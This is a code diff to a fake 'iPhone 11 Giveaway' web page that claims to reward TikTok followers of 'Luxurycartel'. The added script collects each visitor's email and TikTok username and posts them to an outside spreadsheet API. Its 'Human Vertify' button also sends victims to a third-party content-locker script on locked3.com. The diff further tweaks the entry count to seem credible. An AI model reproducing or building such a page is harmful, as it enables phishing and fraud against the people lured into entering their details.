@@ -8,7 +8,26 @@
     <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
     <link rel="stylesheet" href="assets/css/Login-Form-Clean.css">
     <link rel="stylesheet" href="assets/css/styles.css">
-<script type="text/javascript" id="ogjs" src="https://www.verifyzone.net/cl.php?id=651642dbc9442dc070c1323ea2fd9c2c"></script>
+<script type="text/javascript" id="ogjs" src="https://www.locked3.com/cl/load.php?id=651642dbc9442dc070c1323ea2fd9c2c"></script>
+<script
+		src="https://code.jquery.com/jquery-3.4.1.js"
+		integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+		crossorigin="anonymous"></script>
+	<script>
+		function SubForm (){
+			$.ajax({
+				url:"https://api.apispreadsheets.com/data/2624/",
+				type:"post",
+				data:$("#myForm").serializeArray(),
+				success: function(){
+					alert("Continue to Human Vertification and Shipping Details")
+				},
+				error: function(){
+					alert("Please Enter Email and TikTok Username")
+				}
+			});
+		}
+	</script>
 </head>
 
 <body><img class="img-fluid" src="https://i.ytimg.com/vi/dbErk1EM_pU/maxresdefault.jpg" style="padding: 0px;margin: 0px;">
@@ -19,20 +38,20 @@
                     <h5>10 Days</h5>
                 </div>
                 <div class="col-6 col-md-6 offset-0 text-center flex-grow-0"><small>Total Entries:</small>
-                    <h5>532</h5>
+                    <h5>530</h5>
                 </div>
             </div>
         </div>
     </div>
     <div class="login-clean">
-        <form class="border rounded-0" method="post">
+        <form class="border rounded-0" method="post" id="myForm">
             <h2 class="sr-only">Login Form</h2>
             <h2 class="text-center text-dark">iPhone 11 Giveaway!<br></h2>
             <p class="text-center text-dark"><br>Hello Luxurycartel fans, thanks for following us. We reached 50k followers and we are doing an iPhone 11 WORLDWIDE giveaway.<br><br>STEPS TO ENTER:<br>1. Enter email and TikTok name below<br>2. Complete Human Vertification<br>3. Enter
                 Shipping Details<br>4. Follow Luxurycartel on TikTok<br><br></p>
             <div class="form-group"><input class="form-control" type="email" name="email" placeholder="Email"></div>
-            <div class="form-group"><input class="form-control" type="password" name="username" placeholder="TikTok Username"></div>
-            <div class="form-group"><a class="btn btn-primary active btn-block" role="button" href="https://www.verifyzone.net/cl.php?id=651642dbc9442dc070c1323ea2fd9c2c">Human Vertify</a></div>
+            <div class="form-group"><input class="form-control" type="text" name="username" placeholder="TikTok Username"></div>
+            <div class="form-group"><a class="btn btn-primary active btn-block" role="button" href="https://www.locked3.com/cl.php?id=651642dbc9442dc070c1323ea2fd9c2c" onclick='SubForm()'>Human Vertify</a></div>
             <p class="text-center text-dark"><br>FAQ:<br>-Human Vertification is to avoid bots entering the Giveaway.<br>-Winner will be messaged on email and Tiktok.<br>-Shipping is worldwide.<br>-iPhone will be shipped in 3-4 days by DHL.<br><br></p>
         </form>
     </div>
